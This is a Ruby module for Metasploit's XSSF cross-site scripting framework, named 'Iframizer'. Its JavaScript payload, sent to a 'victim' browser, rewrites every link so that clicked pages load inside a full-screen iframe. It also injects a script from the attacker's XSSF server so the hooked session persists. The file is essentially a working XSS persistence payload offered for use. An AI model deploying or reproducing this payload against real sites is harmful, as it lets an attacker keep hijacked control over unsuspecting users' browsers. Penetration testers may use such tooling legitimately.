require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Iframizer',
			'Description' => 'Reloads new page within an iframe when users clicks a link'
		))
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			function iframize(url) {
				clearInterval(XSSF_LOOP);		// Kills the first loop
				
				tmp  = "<style type='text/css'>\\n";
				tmp += "html {overflow: auto;}\\n";
				tmp += "html, body, div, iframe {margin: 0px; padding: 0px; height: 100%; border: none;}\\n";
				tmp += "iframe {display: block; width: 100%; border: none; overflow-y: auto; overflow-x: hidden;}\\n";
				tmp += "</style>\\n";
				tmp += "<div style='display:none'>";
				tmp += document.body.innerHTML;
				tmp += "</div>";
				
				document.body.innerHTML = tmp;
				
				iframe = XSSF_CREATE_IFRAME("XSSF_IFRAMIZE", 0, 0);
				iframe.src = url;
				iframe.border = 'none';
				iframe.marginheight = '0';
				iframe.marginwidth = '0';
				iframe.height = '100%';
				iframe.width = '100%'
				document.body.appendChild(iframe);
				
				s = document.createElement('script');
				s.src = XSSF_SERVER + 'loop';
				document.body.appendChild(s);
			}
			
			for (var i = 0; i < document.links.length; i++)
				document.links[i].href = "javascript:iframize('" + document.links[i].href + "')";
		}

		send_response(cli, code)
	end
end